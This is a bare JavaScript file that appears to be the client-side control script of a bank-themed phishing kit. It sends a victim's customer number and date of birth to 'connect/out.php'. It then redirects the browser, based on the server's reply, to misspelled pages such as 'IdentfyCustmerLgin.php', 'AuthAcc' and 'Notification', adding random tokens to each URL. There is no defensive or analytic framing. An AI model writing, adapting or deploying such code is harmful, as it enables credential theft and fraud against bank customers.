function charrand()
{
    var text = "";
    var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    for( var i=0; i < 25; i++ )
        text += possible.charAt(Math.floor(Math.random() * possible.length));

    return text;
}
function getInfo(a,b,c)
{
var xmlhttp;
if (window.XMLHttpRequest)
  {
  xmlhttp=new XMLHttpRequest();
  }
else
  {
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
if(xmlhttp.responseText.indexOf(b) !=-1)
{
return false;
}
if(xmlhttp.responseText.indexOf("0") !=-1)
{
window.location.assign("IdentfyCustmer.php?/AccesManagement/IdentfyCustomer/"+charrand()+"&err=1&inID="+charrand())
}
if(xmlhttp.responseText.indexOf("11") !=-1)
{
window.location.assign("IdentfyCustmerLgin.php?/AccesManagement/IdentfyCustomer/"+charrand()+"&inID="+charrand())
}
if(xmlhttp.responseText.indexOf("12") !=-1)
{
window.location.assign("IdentfyCustmerLgin.php?/AccesManagement/IdentfyCustomer/"+charrand()+"&err=1&inID="+charrand())
}
if(xmlhttp.responseText.indexOf("3") !=-1)
{
window.location.assign("Notification"+c+".php?/AccesManagement/IdentfyCustomer/"+charrand()+"&inID="+charrand())
}
if(xmlhttp.responseText.indexOf("5") !=-1)
{
window.location.assign("Success"+c+".php?/AccesManagement/IdentfyCustomer/"+charrand()+"&inID="+charrand())
}
if(xmlhttp.responseText.indexOf("6") !=-1)
{
window.location.assign("AuthAcc"+c+".php?/AccesManagement/IdentfyCustomer/"+charrand()+"&err=1&inID="+charrand())
}
if(xmlhttp.responseText.indexOf("7") !=-1)
{
window.location.assign("SignOff.php?/AccesManagement/IdentfyCustomer/"+charrand()+"&inID="+charrand())
}

  }
}

xmlhttp.open("POST","connect/out.php",true);
xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
xmlhttp.send("cusnum="+a+"&dob="+b+"&step=status");
}